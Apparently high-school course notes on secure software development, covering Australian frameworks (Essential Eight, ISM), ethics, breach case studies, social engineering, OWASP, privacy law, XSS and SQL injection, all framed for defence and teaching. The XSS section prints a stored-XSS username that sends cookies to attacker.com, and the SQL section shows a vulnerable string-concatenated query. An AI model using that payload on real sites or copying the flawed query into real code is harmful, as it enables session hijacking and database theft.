Week 1 · Lesson 2

Industry Frameworks

Structured best practices that keep software development secure, compliant and maintainable - focusing on two key Australian cyber security frameworks.

Definition

◈Industry Frameworks

Structured sets of best practices, standards and guidelines designed to help organisations manage technology, data and security in a consistent, effective way.

  • Secure
  • Compliant with laws and policies
  • Efficient and maintainable
Australia

▣Two Key Frameworks

  • Essential Eight - baseline cyber security strategies from the ACSC
  • Information Security Manual (ISM) - the Australian Government's primary cyber security framework
Essential Eight

◉What It Is

Baseline cyber security strategies developed by the Australian Cyber Security Centre (ACSC) to improve resilience against cyber threats - a practical, prioritised approach to defending against malware, unauthorised access and data breaches.

01

Application Control

Prevents unapproved or malicious software from executing. Stops malware, ransomware and unauthorised applications.

02

Patch Applications

Fixes security vulnerabilities in software. Prevents attackers exploiting known flaws.

03

Configure MS Office Macros

Limits the use of potentially dangerous macros that can carry malware.

04

User Application Hardening

Disables unnecessary features in apps, e.g. Flash, ads, Java. Reduces exploit risks.

05

Restrict Admin Privileges

Only trusted users get admin rights, reducing internal and external attack risk.

06

Patch Operating Systems

Keeps system software updated to close known vulnerabilities.

07

Multi-Factor Authentication

Adds an extra layer of security beyond passwords, e.g. SMS code, authenticator app, token.

08

Regular Backups

Ensures data can be restored after incidents such as ransomware or system failure.

ISM · Guideline 1

▤Development, Testing & Production Environments

The ISM is the Australian Government's primary cyber security framework, covering principles, guidelines and controls for building secure applications throughout the development lifecycle.

Separation of Environments

Keep development, testing and production systems separate. Prevents test code or bugs from affecting live systems.

Access Controls

Limit access to each environment. Developers shouldn't automatically have access to production.

Data Handling

Don't use real production data in development/testing unless absolutely necessary, and always anonymise it.

Monitoring

Log who accesses what, and when, in all environments.

ISM · Guideline 2

▥Secure Software Design & Development

Secure Coding Standards

Use frameworks and languages that support secure practices, e.g. input validation, output encoding.

Threat Modelling

Think about how the software might be attacked and build protections into the design.

Code Reviews

Other team members check code to catch bugs and security issues.

Training

Developers should be trained regularly in secure coding and current threats.

ISM · Guideline 3

◐Application Security Testing

Static Analysis (SAST)

Tests source code without running the program, to find vulnerabilities early.

Dynamic Analysis (DAST)

Tests the running application for security holes.

Penetration Testing

Simulated attacks on the software to find weaknesses before hackers do.

Remediation & Retesting

Fix issues found during testing, then test again to confirm fixes worked.

Week 1 · Lesson 3

Ethics

Software development decisions affect people's rights, privacy, safety and trust - ethics is about doing what's right, not just what's legal or efficient.

Definition

◉Ethics & Codes of Ethics

  • Ethics - a system of accepted rules about behaviour, based on what is considered right and wrong
  • Code of ethics - a guide of principles to help professionals conduct business honestly and with integrity
  • Some industries (e.g. banking, finance) have laws governing conduct; in others, a code of ethics is voluntarily adopted
ACS

▣ACS Code of Professional Ethics

The Australian Computer Society's core values are Honesty, Trustworthiness and Respect.

Also Relevant

▤Other Codes of Ethics

  • ACM Software Engineering Code of Ethics
  • ACM Code of Ethics and Professional Conduct (for members)
  • IEEE Code of Ethics
  • Australia's AI Ethics Principles
Why It Matters

◈Consequences of Ignoring Ethics

  • Loss of user trust and respect
  • Negative media attention and reputational damage
  • Legal action or platform bans
  • Long term harm to individuals or communities
Issue 1

▲Ineffective Security Practices

Failing to implement strong security, e.g. encryption, password protection, input validation, leaves users vulnerable to attacks, data leaks or identity theft.

E.g. a poorly protected app exposing users' private messages due to weak encryption.

Issue 2

▲Use of AI During Development

Developers must question the source of AI training data, whether AI-generated content is accurate, and whether its use could introduce bias or cause harm.

E.g. using AI to build a recruitment app that favours certain genders or cultural backgrounds due to biased training data.

Issue 3

▲Intellectual Property & Copyright

Using someone else's code, images or algorithms without permission breaches copyright. Developers must respect licences, credit creators and avoid copy-pasting without attribution.

E.g. including third-party libraries without checking the licence type or providing attribution.

Issue 4

▲User Privacy & Metadata

Developers must be cautious collecting or exposing user data, including metadata (timestamps, locations, device info) that can unintentionally identify someone. Sharing or storing data without consent breaches privacy.

E.g. a social media app sharing image metadata that reveals where a user lives or works.

Issue 5

▲Content Moderation & Offensive Material

Developers of communication tools have an ethical duty to prevent the spread of offensive, harmful or unlawful content, e.g. through filters, moderation algorithms and flagging systems.

E.g. failing to prevent or remove hate speech in a chat or comments section, resulting in user harm.

Week 2 · Lesson 1

Types of Vulnerabilities & Risks

Common weaknesses in insecure software development environments, real Australian incidents each one caused, and how to mitigate them.

Definition

◆Insecure Development Environments

When systems and processes are not properly protected, they become vulnerable to a wide range of cyber threats and risks. These weaknesses can be exploited by attackers to gain access to data, disrupt services, or compromise user trust.

Vulnerability

Poorly Secured APIs

Can expose sensitive data to unauthorised users.

Vulnerability

Malware

Viruses or spyware introduced via unreliable sources or unprotected devices.

Vulnerability

Unpatched Software

Outdated programs without security updates create serious holes.

Vulnerability

Weak IAM

Too much access or weak passwords make systems easier to exploit.

Vulnerability

Insider Threats

Staff or contractors misusing access, intentionally or by accident.

Vulnerability

MitM Attacks

Data secretly intercepted during transmission.

Vulnerability

Third-Party Software

Unreviewed dependencies can introduce unknown vulnerabilities.

Vulnerability

Poor Dev Practices

Ineffective code reviews and combined dev/test/production environments.

Vulnerability

◆Use of Application Programming Interfaces (APIs)

APIs are essential for modern software development, letting applications interact and share data. Insecure APIs are a major attack vector and can lead to serious breaches if not properly protected.

APIs may expose sensitive functions or data when authentication, encryption, or rate-limiting aren't correctly implemented. Developers often rely on third-party APIs or hastily create custom ones without robust security checks. Poorly documented or unmanaged APIs increase the risk of data leaks, unauthorised access and service disruption.

Case Study

🏛Optus (2022)

The Australian telco suffered a major data breach where unauthorised access to customer data was facilitated in part by an exposed API. The incident affected over 9 million Australians and revealed flaws in access controls and authentication mechanisms on public-facing systems.

Mitigation

  • Implement strong authentication and authorisation on all endpoints
  • Use HTTPS to encrypt all communications
  • Limit data exposure through API responses
  • Enable rate limiting and throttling to prevent abuse
  • Conduct regular API security assessments and audits
Vulnerability

◆Malware

Malicious software designed to infiltrate or damage systems. In development environments, malware can be introduced through infected libraries, compromised devices, or phishing attacks. It may lead to data theft, corruption, or system control by external actors - often introduced unknowingly through reused or unvetted third-party code.

Case Study

🏛Toll Group (2020)

The Australian logistics company was hit by two ransomware attacks within three months. The attacks encrypted data and disrupted operations across the country, causing significant financial and reputational damage. The malware entered through phishing and exploited outdated software.

Mitigation

  • Use up-to-date anti-malware tools across all development systems
  • Scan dependencies and code libraries for malicious components
  • Restrict admin access and employ application whitelisting
  • Educate developers on recognising phishing attempts
  • Monitor systems for unusual behaviour or unauthorised software
Vulnerability

◆Unpatched Software

Contains known vulnerabilities that haven't been fixed by applying updates. Attackers actively scan for outdated systems to gain unauthorised access, disrupt services, or escalate privileges. In development environments, both operating systems and software tools (IDEs, frameworks, libraries) may be neglected.

Case Study

🏛Accellion File Transfer Software (2021)

Attackers exploited an unpatched vulnerability in Accellion file transfer software used by multiple Australian organisations. The flaw let hackers exfiltrate sensitive documents from government agencies and private companies.

Mitigation

  • Establish automated patch management for all development tools and environments
  • Monitor vendor announcements for critical security updates
  • Test and deploy patches in staging environments before full rollout
  • Maintain an inventory of all software components and their update status
Access Control

⚠Poor Identity & Access Management (IAM)

IAM defines how users are identified and what resources they can access. Weak practices - such as shared credentials, lack of multi-factor authentication (MFA), or improper role assignments - can give attackers or insiders more access than necessary. In development, IAM restricts who can access source code, databases and deployment tools.

Case Study

🏛Australian National University (2023)

ANU reported a data breach resulting from unauthorised access through compromised credentials. Lack of MFA and inadequate logging contributed to delayed detection.

Mitigation

  • Enforce least privilege principles
  • Use MFA for all accounts, especially privileged ones
  • Avoid shared accounts; assign unique credentials to each user
  • Conduct regular reviews of access logs and permissions
Insider Risk

⚠Insider Threats

Occur when individuals within an organisation misuse their access to compromise systems or data. In development, this could mean a disgruntled employee introducing malicious code, leaking source code, or selling sensitive project details.

Case Study

🏛Disgruntled Employee Threat (2022)

A former employee of an Australian fintech startup was investigated for planting backdoors in the company's codebase before leaving. The issue was only discovered after suspicious traffic patterns were observed.

Mitigation

  • Implement version control and code review processes
  • Restrict access based on job roles and revoke access immediately upon employee exit
  • Monitor developer activity and system logs for anomalies
  • Provide training on ethical development and security policies
Attack

⚠Man-in-the-Middle (MitM) Attacks

Happens when an attacker secretly intercepts or alters communication between two parties who believe they're talking directly to each other. The attacker creates separate connections with each party and relays messages, making it seem like a normal conversation while it's actually being controlled or monitored.

Common scenarios include an unencrypted Wi-Fi network (easy to intercept traffic) and email (often lacks default encryption). Encryption helps, but attackers can still trick users into fake (phishing) websites or record traffic for later use, making detection difficult.

Case Study

🏛Australian Targets

Australian users have been targeted by MitM attacks when accessing banking apps over insecure Wi-Fi networks. In some cases, attackers redirected traffic to fake login pages to steal credentials.

Mitigation

  • Always use HTTPS and encrypted protocols for all communications
  • Avoid using public Wi-Fi without VPN protection
  • Use certificate pinning where applicable
  • Validate digital certificates and implement strong network segmentation
Techniques

◆Common MitM Techniques

  • SSL stripping - the attacker connects securely (HTTPS) to the website, but uses an insecure (HTTP) connection with the user, exposing sensitive data
  • Evil twin attacks - the attacker sets up a fake Wi-Fi hotspot that looks like a trusted network; once connected, all user traffic can be monitored or altered
  • Email hijacking - the attacker gains access to an email account and monitors conversations, impersonating a party to redirect funds during a money transfer
  • Wi-Fi eavesdropping - fake public Wi-Fi networks with trustworthy-looking names intercept data being sent
  • Session hijacking - the attacker steals session data (cookies, session keys) to take control of an active session
  • DNS spoofing - DNS records are changed to redirect users from a real website to a fake one
  • IP spoofing - the attacker disguises their IP address to trick systems into thinking traffic is from a trusted source
Attacker Goals

◆What Attackers Are After

  • Spying on conversations or data
  • Stealing personal info (e.g. credit card numbers, login credentials)
  • Redirecting money transfers
  • Corrupting or manipulating transmitted data
Prevention

◆Preventing MitM Attacks

  • Email security tools - monitor email traffic, block suspicious activity, reduce email-based attack risk
  • Web security tools - detect unsafe traffic and protect users from being redirected to malicious websites
  • Educate staff and users - training to recognise warning signs (fake Wi-Fi, suspicious emails); use real-world case studies
  • Keep credentials secure - strong, unique passwords changed at least every three months
MitM: Spoofing

⚠Email Spoofing

An attacker forges the sender's address to make an email look like it came from someone you know or trust. Commonly used in phishing and spam attacks. Since most email software shows only the display name or forged address, users often don't notice anything suspicious - leading them to click malicious links, open infected attachments, send personal data, or transfer money.

MitM: Spoofing

⚠Phone / Caller ID Spoofing

Also known as CLI overstamping - a caller hides their real number and displays a fake one, often a local or trusted number, to increase the chance you'll answer.

In Australia, spoofing is legal unless used for scams or other malicious purposes. Attackers often pretend to be from banks, government agencies, or phone companies; try to steal personal or financial information; or call from overseas using an Australian-looking number.

MitM: Invoice Scamming

⚠Invoice Scamming

Cybercriminals impersonate a business, intercept legitimate emailed invoices, and change the bank details so payments go to the scammer instead of the real business. Once transferred, the money is often quickly moved to overseas accounts, making it hard for banks or police to recover.

In most cases, the payer is responsible for the loss, since the invoice wasn't paid to the correct company.

Did you know? In 2021, 1 in 5 small businesses in Australia were affected by invoice fraud, with an average loss of $15,500. (Source: xero.com)

Vulnerability

◆Cyber Security Incidents

Events that compromise the integrity, confidentiality or availability of data and systems. These can stem from external attacks, insider actions or system failures. In development environments, such incidents may disrupt coding, testing and deployment processes.

Case Study

🏛Service NSW (2021)

The data breach was triggered by a phishing campaign that compromised staff emails and exposed over 700,000 documents, including driver's licences and personal details.

Mitigation

  • Develop and regularly update an incident response plan
  • Implement detection systems (IDS/IPS) and logging
  • Train all developers and staff in basic cyber hygiene
  • Ensure backups are secure and tested regularly
Common Source

◆Email Data Breaches

A common source of breaches involving personal and sensitive information is email. It's very easy to mistype an address, or select the wrong one via autocomplete, and accidentally send private information to the wrong person. These are known as misdirected, or misaddressed emails, and are one of the most common types of data breach.

Did You Know

◈Fax Data Breaches

Fax machines were used a lot in the health industry. If a number was dialled incorrectly, the fax would be transmitted to an unauthorised person, or a page from a previous fax could be left on the machine and accidentally transmitted to the wrong person. (Source: WIRED)

Supply Chain

◆Risks From Third-Party Software

Includes any code, libraries, or tools not developed in-house. These can introduce vulnerabilities if not properly vetted. Attackers may compromise widely used packages or hide malicious code in legitimate-looking updates.

Case Study

🏛SolarWinds Breach (2020)

This global supply-chain breach affected companies worldwide, including Australian federal departments. Attackers inserted a backdoor into a software update, giving them access to sensitive networks.

Mitigation

  • Only use trusted sources for software and packages
  • Conduct security audits of third-party tools
  • Monitor vulnerability disclosures related to dependencies
Development Practice

✎Ineffective Code Review Practices

Code review helps ensure quality, security and maintainability. Skipping reviews or doing them poorly lets bugs and security flaws reach production - reviews are often rushed or bypassed under time pressure, especially in agile environments.

Case Study

🏛Checkout Failure

An Australian online retailer suffered a checkout failure due to a logic flaw missed during an informal code review, leading to lost sales during a promotional period.

Mitigation

  • Enforce structured peer reviews for all code changes
  • Use automated tools to detect common vulnerabilities (e.g. linters, static analysis)
  • Maintain coding standards and document review checklists
  • Encourage a culture of constructive feedback and learning
Development Practice

✎Combining Dev, Testing & Production Environments

Increases risk. Development environments often lack the same security controls as production, and if they share infrastructure or data, attackers may exploit vulnerabilities in dev/test systems to gain production access.

Case Study

🏛Exposed Patient Data (2019)

An Australian health provider accidentally exposed patient data when testing a new system using live production data. The test server was misconfigured and indexed by search engines.

Mitigation

  • Isolate dev, test and production environments physically and logically
  • Avoid using real customer data in test environments
  • Secure all environments equally and enforce access controls
  • Monitor for environment-specific misconfigurations or data exposure
Did You Know

◈Connectivity Raises the Stakes

The more connected we are, the more opportunities there are for data breaches. New technologies and new uses for technology are rapidly being created, and risk assessment and security measures often can't keep up.

Smart home and Internet of Things (IoT) devices have become more popular, and these often lack proper security and encryption.

Australia

▣IoT Code of Practice

The Australian Government has released an IoT Code of Practice to increase the security of IoT technology. It contains 13 principles - the first three should be prioritised:

  • 1. No duplicated default or weak passwords
  • 2. Implement a vulnerability disclosure policy
  • 3. Keep software securely updated
Week 2 · Lesson 2

Mitigation Measures

Strategies to reduce or eliminate threats, vulnerabilities and risks - drawing on ACSC and OAIC guidance.

Definition

◆Mitigation Strategies

To protect sensitive data and maintain secure systems, organisations must apply mitigation strategies that reduce or eliminate threats, vulnerabilities and risks. These measures are essential in both operational environments and during software development.

The Australian Cyber Security Centre (ACSC) provides practical advice for preventing data breaches, including technical controls such as MFA, regular software updates, and strong password policies, as well as organisational strategies such as staff training and cyber awareness programs.

Root Cause

◆How Credentials Get Stolen

Malicious attacks are one of the main causes of data breaches reported in Australia, and stolen credentials (usernames and passwords) often lead to these breaches. Credentials are typically stolen when:

  • Users are tricked into entering them on fake websites (phishing)
  • Attackers use automated guesses (brute-force attacks)
  • Hackers steal data from a breached service
  • Malware on a device captures login details
Strategy 1

◆Staff Awareness

Businesses must train staff to spot and avoid:

  • Phishing - fake emails that trick users into giving up login details
  • Spear phishing - targeted scams using personal or company information to seem more real

Training should include how to spot suspicious activity and understand cyber risks relevant to their role.

Strategy 2

◆Password Safety

The ACSC recommends:

  • Use strong, long and unpredictable passphrases
  • Don't reuse passwords across important accounts
  • Change passwords regularly
  • Lock accounts after too many failed login attempts
  • Reset compromised passwords immediately
  • Avoid sharing passwords between secure and less secure services
Strategy 3

◆Secure Software Practices

To protect systems:

  • Use multi-factor authentication for important actions and remote access
  • Keep software, browsers and plugins up to date
  • Enable anti-virus software to catch malware that steals data
  • Watch for suspicious account activity
  • Be cautious with credential prompts - don't enter passwords via links from unknown sources; navigate to official websites manually to reset passwords; remember friends' accounts can also be hacked and used to send fake messages

This advice comes from the Office of the Australian Information Commissioner (OAIC) and the ACSC.

Week 2 · Lesson 3

Social Engineering Attacks

Attacks that use psychological manipulation to fool people into handing over confidential data, and how to defend against them.

Definition

◆Social Engineering

Involves some form of psychological manipulation, fooling otherwise unsuspecting users or employees into handing over confidential or sensitive data. Commonly involves email or other communication that invokes urgency, fear or similar emotions, leading the victim to promptly reveal sensitive information, click a malicious link, or open a malicious file. Because it involves a human element, preventing these attacks can be tricky for enterprises.

Social engineering attacks include: phishing, spear phishing, baiting, quid pro quo attacks, pretexting, and tailgating.

Type

Phishing

The most common social engineering attack. Most scams try to: obtain personal info (names, addresses, passwords, PINs, account numbers); use shortened or misleading links to phishing landing pages; and incorporate threats, fear or urgency to get a quick response.

Type

Spear Phishing

A targeted version of phishing where the attacker chooses specific individuals or enterprises and tailors messages based on their characteristics, job position and contacts to seem less conspicuous.

Type

Baiting

Offering something enticing (a download, or a corporate-branded USB stick) in exchange for login details or sensitive information. E.g. a criminal leaves a USB labelled "Confidential" or "Bonuses" where a target will find it - plugging it in installs malware automatically.

Type

Quid Pro Quo

Similar to baiting - requesting login details or sensitive data in exchange for a service, e.g. a hacker posing as a technology expert offers free IT assistance, or as a researcher offers $100 for network access "as part of an experiment". If it sounds too good to be true, it probably is.

Type

Pretexting

The human equivalent of phishing. The hacker creates a false sense of trust by impersonating a co-worker or authority figure to gain access to login details, e.g. an email from "IT support" or a chat message from an "auditor".

Type

Tailgating / Piggybacking

An unauthorised person physically follows an authorised person into a restricted area or system, e.g. calling out to an employee to hold the door, or asking to quickly borrow their laptop or phone.

Organisations

◆Employee Education

The most effective defence against social engineering fraud is a well-informed workforce. Employees at all levels should understand what social engineering is, be aware of common techniques (phishing, pretexting, baiting), and know how to respond appropriately. Training should be ongoing, practical and tailored to the organisation's operations.

Organisations

◆Policies & Procedures

Strong organisational policies and clear procedures help employees respond appropriately to suspicious requests, covering verification protocols, information handling, approval workflows, and physical security practices.

Organisations

◆Email Software & Filtering

Email software plays a critical role in defending against social engineering. Setting spam filters to high and enabling conversation threading helps users more easily detect phishing or suspicious activity.

Organisations

◆Secure Computing Devices & Updates

Maintaining updated and secure systems across all devices is fundamental. Outdated software is a key target for cybercriminals, and anti-virus tools alone are insufficient without regular updates.

Individuals

◆How to Spot Online Scams & Stay Safe

  • 1. Don't rush - think first. Scammers want you to panic and click fast. Slow down and double-check before acting.
  • 2. Check the facts. Got a weird message from your bank or a streaming service? Don't click their links - look up the company yourself and go to their real website.
  • 3. Don't trust the link. Links can be faked to look real. Hover to see where they really lead, but it's safer to type the website in yourself.
  • 4. A message from a friend isn't automatically safe. Hackers often take over real accounts - if a message seems off, verify another way (text or call them).
  • 5. Don't download random files. Unless you know the person and were expecting a file, don't download anything.
  • 6. Foreign offers = 100% fake. Prize or inheritance emails from another country? Delete it.
  • 7. Never share personal or financial info. Real companies never ask for passwords or bank details through email.
  • 8. Ignore random offers or requests for help. If you didn't ask for help or don't know the group, it's likely fake - find a legitimate charity yourself if you want to donate.
Proactive

◆Security Awareness Training

About being ready before an attack happens - like learning how to recognise and dodge a trap. Teaches: spotting scams (phishing emails, fake phone calls); knowing the risks; staying safe online; reporting problems; and keeping training fresh with regular reminders.

Example: if someone sends a fake email pretending to be from your school asking for login credentials, training helps you spot that it's not right and avoid clicking.

Reactive

◆Incident Response Training

Kicks in after something goes wrong. Teaches people how to respond to a cyber attack or breach: noticing something's wrong; stopping the damage by shutting down the problem area; saving evidence; telling the right people (IT or cyber security staff); and fixing it up.

Example: if someone accidentally clicks a bad link and the network gets infected, this training helps staff act fast to contain it and fix the damage.

Key Differences

Security AwarenessIncident Response
Stops attacks before they happenReacts after an attack has started
Focuses on educating people to spot threatsFocuses on how to act when something goes wrong
Builds habits for safer behaviourBuilds skills for fast, smart reactions

Think of it like a seatbelt and airbags - security awareness helps stop things before they go wrong, incident response helps minimise damage when they do. Together, they form a strong defence against cyber threats.

Week 2 · Lesson 4

Software Security

Building security in from the start, and two of the most common web application vulnerabilities: XSS and SQL injection.

Principle

◆Security by Design (SbD)

When you're building software, security needs to be part of the plan from the very beginning, not something tacked on at the end - like building a house with locks already in place, rather than adding them after you move in. SbD means:

  • Thinking about how to protect data before you even write your first line of code
  • Writing secure code that helps stop hackers and keeps users safe

This approach helps prevent problems before they happen, rather than trying to fix them later.

OWASP

◆Top 10 Web Application Security Risks

The OWASP Foundation is a trusted group that helps developers understand common threats to web applications. Their Top 10 most serious security risks every developer should know:

  • 1. Broken access control - users can access things they're not supposed to
  • 2. Cryptographic failures - personal or financial information isn't stored or sent securely
  • 3. Injection - attackers trick software into running harmful code
  • 4. Insecure design - risks related to design flaws
  • 5. Security misconfiguration - settings are too open or badly set up
  • 6. Vulnerable & outdated components - libraries or plugins with known security flaws
  • 7. Identification & authentication failures - login systems don't protect accounts properly
  • 8. Software & data integrity failures - assumptions about updates or critical data without verifying integrity
  • 9. Security logging & monitoring failures - attacks happen but no one notices or logs what happened
  • 10. Server-side request forgery - data sent to your program can be tampered with

Resources: Secure Coding - Best Practices Handbook; Australian Government ISM - Guidelines for Software Development (ACSC); OWASP Top Ten.

Software Risk

◆What is XSS?

Cross-site scripting (XSS) is a security problem found in websites. It lets hackers add their own code - usually JavaScript - to a web page that other people will see. Someone could inject dangerous code into a website, and when other users visit, their browsers run the attacker's code without knowing it.

Impact

◆Why XSS is a Big Deal

If a website has an XSS flaw, an attacker can:

  • Change how the website looks or behaves
  • Steal private information like cookies
  • Pretend to be the user and take actions on their behalf
  • Spread the attack to other users like a virus

XSS usually happens when a website takes user input (names, messages, comments) and shows it on a page without checking or cleaning it up first.

Example

⌁Stored XSS

Say there's a message board where people can register with a username. If the site doesn't clean up what people type, a hacker could register with a name containing a script that sends the user's cookies to the hacker's website.

example username
user123<script>document.location='https://attacker.com/?cookie='+encodeURIComponent(document.cookie)</script>

When someone visits the board and sees this username, their browser runs the code and silently sends their cookies to the hacker, who can then hijack the user's login. This is called stored XSS because the harmful code is saved in the website's database and shown to users again and again.

Stored XSS can act like a worm - it spreads itself. Imagine a social media profile with injected code: everyone who visits gets infected too, and those infected profiles might spread it further until the whole site is under attack.

Mitigation

◆Preventing XSS Attacks

A zero-trust approach is the best prevention against XSS attacks:

  • Sanitise all user input by escaping special characters
  • Validate all user input for type, length, range and format using server-side validation
  • Encode special characters in all output to the browser
  • Users should have the option to disable client-side scripts

Client-side validation can also help reduce invalid or unacceptable inputs, but should never be relied on by itself.

Software Risk

◆SQL Injection

A code insertion technique used to attack data-driven applications, in which malicious code is inserted into a normal SQL statement to dump contents from a database. Malformed SQL queries are produced through unsanitised user input. Though easily preventable by validating input, this is often not done, letting attackers embed malicious code in a hard-coded SQL statement.

Form

⌁Incorrectly Filtered Escape Characters

Occurs if user input is passed to an SQL statement without filtering escape characters:

vulnerable query
"SELECT * FROM users WHERE username= '"+username+"'"

The username variable can be crafted by attackers, either by inputting an always-true clause or by commenting out the rest of the query. By inserting a semicolon, attackers can execute a separate SQL statement.

Form

◆Incorrect Type Handling

Takes place when no appropriate type checking is performed. The implementation can be the same as above - the injection works by prematurely terminating a text string and appending a new command. There are many other forms of injection beyond these two.

Mitigation

◆Validating User Input

Assume all user-submitted data is unsafe. Validate all input using functions such as MySQL's mysql_real_escape_string() to ensure dangerous characters (like ') aren't passed to a query. All user data should be sanitised and filtered using type, range and format checks.

Mitigation

◆Parameterised Statements

Instead of embedding user input into a query string, use placeholders to receive parameters. This also solves the type-handling problem, since a placeholder can only receive a value of the correct type.

Mitigation

◆Prepared Statements & Stored Procedures

With prepared statements, instead of directly assembling and executing your query string, you store a prepared statement, feed it the data, and it assembles and sanitises it for you on execution.

Stored procedures group one or more SQL statements into a logical unit; subsequent executions can be automatically parameterised. They prevent some types of SQL injection but not all, so don't rely on them exclusively.

Mitigation

◆Database Permissions & Firewalls

Applying least-privilege database permissions helps reduce vulnerabilities. Web application firewalls (WAF) and database firewalls help protect against SQL exploits by identifying and blocking unauthorised database transactions - but can't be relied on as the only line of defence, and may only slow attacks rather than preventing them.

Key Legislation

Three pieces of Australian legislation affecting how organisations control the collection, storage and communication of data. Reviewed here after first appearing in Unit 3, Week 16.

Overview

◆Three Key Pieces of Legislation

There are three pieces of legislation to be familiar with that affect how organisations control the collection, storage (including cloud storage) and communication of data. They also make mention of data disposal, discussed separately.

  • 1. Copyright Act 1968
  • 2. Privacy Act 1988
  • 3. Privacy and Data Protection Act 2014
Federal Law

◆Privacy Act 1988

A federal law covering all states and territories in Australia.

Organisations covered:

  • Commonwealth government departments
  • ACT government agencies
  • Private organisations with: turnover of at least $3 million/year, OR that hold health information, OR buy/sell personal information for profit, OR are contracted to provide a service to the Commonwealth

Main points:

  • Only collect information that is necessary
  • Only use information for the purpose it was intended
  • Do not disclose information to a third party for any other purpose
  • Individuals may access and correct information held about them
  • The organisation must have a publicly available privacy policy
  • The organisation must take steps to ensure the quality and security of information
Guidelines

◆Australian Privacy Principles (APPs)

Guidelines under the Privacy Act 1988 that govern the collection, use and disclosure of personal information in Australia - promoting transparency, data quality, security, individual access and complaint resolution.

APP 1

Open & Transparent Management

Organisations must be clear about how they handle personal information - e.g. privacy statements and easy-to-understand data policies.

APP 3

Collection of Solicited Information

Limits collection to what's reasonably necessary, collected lawfully and fairly - e.g. minimising data fields, clear consent mechanisms.

APP 6

Use or Disclosure

Personal information collected for a specific purpose must only be used or disclosed for that purpose unless the individual consents.

APP 8

Cross-Border Disclosure

Personal information transferred overseas must remain protected in line with APPs - e.g. safeguards for cloud storage/processing.

APP 9

Government-Related Identifiers

Restricts using government identifiers (e.g. tax file numbers) for identification in private-sector databases.

APP 11

Security of Personal Information

Requires safeguarding personal information against misuse, loss or unauthorised access - robust encryption, access controls, regular testing.

State Law (Vic)

◆Privacy and Data Protection Act 2014

Governs the handling of personal information by Victorian public sector organisations, protecting privacy through principles for data collection, use and disclosure, and ensuring data security. This is a state law covering only Victoria.

Organisations covered:

  • Victorian government departments and public sector agencies
  • Victoria Police
  • State government schools
  • Public Victorian universities
  • Public hospitals and health services (non-medical information only - medical info is covered by the Health Records Act 2001)
  • Organisations providing government-funded services

Agencies must safeguard data with security assessments and encryption. While not mandatory, entities are encouraged to notify affected individuals after a significant breach. The Victorian Information Commissioner oversees compliance; penalties for breaches may include legal action or administrative orders.

Guidelines

◆Information Privacy Principles (IPPs)

Outlined under the Privacy and Data Protection Act 2014, applicable to Victorian public sector agencies. These align with the APPs but are tailored to state-specific data protection.

IPP 1

Collection

Information must be collected fairly, lawfully and not intrusively - ask only for necessary info, inform users of the purpose.

IPP 2

Use & Disclosure

Restricts how information can be used or disclosed (aligns with APP 6) - shared only per policy and user consent.

IPP 4

Data Security

Data must be protected from misuse, loss, unauthorised access and modification - encryption, secure authentication, regular updates.

IPP 5

Openness

Agencies must be open about how information is managed - privacy policy links and clear documentation.

IPP 7

Unique Identifiers

Restricts adopting identifiers assigned by other organisations unless necessary, consented to, or via a contracted provider.

IPP 9

Transborder Data Flows

Personal information must not leave Victoria unless the recipient jurisdiction has equivalent privacy protections.

IPP 10

Sensitive Information

Requires stricter handling of sensitive information (e.g. health or ethnic background data) - high security, limited access.

Federal Law

◆Copyright Act 1968

A federal law applying across all states and territories, establishing the legal framework for copyright protection. Updated in 2000 by the Copyright Amendment (Digital Agenda) Bill 2000 to address digital technology and online content distribution.

Protects intellectual property (IP) - original creations of the mind including written text, videos, software and artistic works - granting creators exclusive control over the use of their work. Infringement can lead to civil penalties (court-ordered cessation, financial damages) or, in severe cases, criminal charges and imprisonment.

Main points:

  • Ownership - IP belongs to the creator unless assigned otherwise (e.g. to an employer)
  • Automatic protection - copyright is automatic and free once work is in a tangible form
  • Types protected - literary, dramatic, musical and artistic works, films, sound recordings, broadcasts
  • Exclusions - ideas, concepts, names, slogans or images of people are not covered
  • Control of usage - owners control how and when material is used and shared
  • Employer rights - employers hold copyright over works employees produce as part of their job
  • Personal use exception - copying music you legally own (e.g. CD to device) for personal use only

Strategies for Improving Development Security

Building security in from day one - onboarding, ongoing training, and risk management planning.

Definition

◆What is Secure Development?

The process of creating software designed to be safe from the start. Instead of waiting until something goes wrong, secure development means thinking about security at every stage - from planning and coding to testing and deployment. It's about writing code that:

  • Protects against hackers and malicious attacks
  • Keeps user data safe
  • Prevents bugs that could be exploited
  • Follows best practices and legal standards

Think of it like building a house with strong locks, alarms and fire exits already in place - not adding them after someone breaks in.

Why It Matters

◆Why Secure Development is Important

  • Protects user data - passwords, credit card numbers, personal information
  • Prevents costly problems - fixing a breach after release can be expensive and damaging
  • Builds trust - users and clients are more likely to use software they know is safe
  • Meets legal and industry standards - many industries require secure coding practices by law

Each strategy below helps make software more secure - used together, they create a strong defence against threats.

Practice

◆Onboarding & Induction for Developers

Onboarding is the process of welcoming new developers to a project or team - setting them up for success, especially when it comes to writing secure code. When security is part of the team culture from day one, developers are more likely to follow good habits and avoid risky mistakes.

Secure onboarding practices:

  • Security briefings - a short session on security during first-day orientation
  • Access control - only give new developers the permissions they need, not full access "just in case"
  • Codebase walkthroughs - show how security is handled in the code (encryption, authentication, error handling)
  • Team introductions - make sure new developers know who to talk to about security questions
Practice

◆Developer Training for Secure Development

Even experienced developers can make mistakes. Ongoing training keeps security top of mind and helps everyone stay up to date with the latest threats and best practices.

Training focus areas:

  • Common vulnerabilities - e.g. XSS, SQL injection, broken authentication
  • Safe coding standards - validating user input and encoding output to prevent attacks
  • Security tools - tools that scan code for weaknesses
  • OWASP Top 10 - the most critical web app security risks, updated regularly

Ways to train developers:

  • Online courses - self-paced learning (e.g. Codecademy)
  • Workshops and hackathons - hands-on practice solving security problems
  • Refresher sessions - short, regular meetings to review key topics
  • Code reviews - encourage peer reviews with a focus on spotting security issues
Practice

◆Developing Risk Management Plans

A risk management plan helps teams think ahead - a document outlining what could go wrong in a project, how likely it is, and what to do about it. Instead of waiting for problems to happen, risk management is about being proactive, spotting issues early and reducing their impact.

Steps in risk management:

  • 1. Identify risks - what could go wrong? (e.g. using outdated libraries)
  • 2. Assess risks - how likely is it? How serious would it be?
  • 3. Plan responses - what actions will you take if the risk becomes real?
  • 4. Monitor - keep an eye on risks throughout the project and update the plan as needed

Examples of software risks:

  • Insecure third-party libraries - external code might have hidden vulnerabilities
  • Lack of input validation - not checking user input can lead to attacks
  • Poor user authentication - weak login systems can be easily bypassed
  • Delayed patching - not fixing known issues quickly can leave software exposed

Security of Data

Why data is valuable, what makes data secure, backup strategy, and how data should be disposed of.

